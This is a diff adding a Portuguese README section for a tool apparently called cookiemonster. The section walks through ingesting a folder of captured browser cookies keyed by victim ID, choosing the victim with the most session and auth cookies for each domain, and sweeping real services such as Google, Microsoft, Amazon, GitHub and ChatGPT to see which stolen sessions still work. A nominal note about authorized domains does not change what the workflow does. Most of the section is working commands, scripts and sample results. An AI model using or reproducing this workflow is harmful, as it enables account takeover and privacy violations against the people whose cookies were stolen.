@@ -356,6 +356,116 @@ python -m cookiemonster report --db store.db --out reports
 
 ## 5. Workflow Avançado
 
+### 5.0 Sweep em Escala (todos os candidatos)
+
+Para testar **todos os candidatos disponíveis** na pasta `Cookies/`:
+
+**Passo 1: Ingira o dataset (uma vez).**
+
+```bash
+python -m cookiemonster ingest --dir Cookies --db store.db --resume
+```
+
+**Passo 2: Atualize `scope.txt` com TODOS os domínios-alvo que você tem autorização para testar.** Para um sweep de demonstração:
+
+```
+# scope.txt
+127.0.0.1
+localhost
+amazon.com
+github.com
+spotify.com
+netflix.com
+tiktok.com
+chatgpt.com
+accounts.google.com
+# ... (todos os dominios autorizados)
+```
+
+**Passo 3: Use o script `lab/sweep_all.py` (paralelo).**
+
+```bash
+# Gera uma lista de candidatos via 'best'
+python -m cookiemonster best --db store.db --domain amazon.com --limit 1
+# Repita para cada dominio que você quer testar e compile em um arquivo:
+# _targets.txt
+#   amazon.com,112
+#   github.com,1456
+#   spotify.com,466
+#   tiktok.com,2390
+#   ...
+
+# Sweep httpx (rapido, ~17s para 24 dominios)
+python lab/sweep_all.py \
+  --db store.db --targets _targets.txt \
+  --channel httpx --workers 8 --allow-unsafe-scope
+
+# Sweep Playwright (mais lento, ~2min para 24 dominios)
+python lab/sweep_all.py \
+  --db store.db --targets _targets.txt \
+  --channel playwright --workers 3 --max-wait-ms 5000 --allow-unsafe-scope
+```
+
+**Saída exemplo (Playwright, 24 dominios, 3 workers):**
+
+```
+Sweep: 24 alvos, canal=playwright, workers=3
+
+[1/24]      6s (eta  144s) myaccount.google.com vid=1151 ?          ERR=check_failed
+[2/24]     10s (eta  113s) login.live.com       vid=1973 UNKNOWN    (conf=0.30)
+[3/24]     14s (eta   95s) accounts.google.com  vid=1355 UNKNOWN    (conf=0.30)
+...
+[24/24]   135s (eta    0s) chatgpt.com         vid=1939 LIKELY     (conf=0.70)
+
+Concluido em 135s
+
+=== Resumo ===
+  CONFIRMED: 0
+  LIKELY: 1
+    chatgpt.com vid=1939 conf=0.70
+  ANONYMOUS: 6
+    accounts.spotify.com vid=1973 conf=0.85
+    login.microsoftonline.com vid=1973 conf=0.85
+    ...
+```
+
+**Relatorio consolidado** em `reports/sweep_<canal>_<timestamp>.md` (gerado automaticamente).
+
+**Comando único para gerar a lista de alvos** (versão automática):
+
+```bash
+# Selecao automatica: top N dominios por auth no store
+python -c "
+import sqlite3
+from collections import Counter
+c = sqlite3.connect('store.db')
+# Conta auth por dominio (heuristica via nome do cookie)
+auth = Counter()
+for d, n in c.execute(\"SELECT domain, name FROM cookies\"):
+    if any(x in n.lower() for x in ('session','token','auth','sid','user')):
+        auth[d.lstrip('.')] += 1
+# Top 20 dominios
+for d, n in auth.most_common(20):
+    print(d)
+" > _candidates.txt
+# Selecionar vitima por dominio
+python -c "
+import sqlite3
+c = sqlite3.connect('store.db')
+for d in open('_candidates.txt').read().splitlines():
+    r = c.execute('SELECT victim_id FROM cookies WHERE domain LIKE ? GROUP BY victim_id ORDER BY COUNT(*) DESC LIMIT 1', (f'%{d}',)).fetchone()
+    print(f'{d},{r[0] if r else 0}')
+" > _targets.txt
+```
+
+**Dica para escalar:**
+
+- Combine `httpx` (rápido, ~1s/check) com `playwright` (preciso, ~10s/check): primeiro filtre com httpx, depois valide com playwright os casos `LIKELY` ou suspeitos.
+
+- O tempo total depende do número de alvos e do `workers`. Para 100 alvos: ~2 min com httpx/8, ~30 min com playwright/3.
+
+- O **estado UNKNOWN** no canal httpx é esperado para sites modernos (Google, Microsoft, Spotify, Twitch) — não significa falha, significa "precisa Playwright para confirmar".
+
 ### 5.1 Batch (`check-batch`)
 
 Roda `check` em sequência para as **N melhores vítimas** de um domínio. Útil para descobrir se **alguma** das capturas ainda tem sessão válida.
